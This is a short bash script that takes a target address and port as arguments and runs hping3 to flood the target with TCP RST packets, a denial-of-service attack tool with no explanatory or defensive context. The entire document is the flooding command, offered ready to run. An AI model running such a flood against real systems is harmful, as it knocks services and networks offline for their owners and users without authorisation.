#!/usr/bin/env bash
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    hping3 -R -p 80 --flood "${TARGET}" -p "${PORT}"
fi
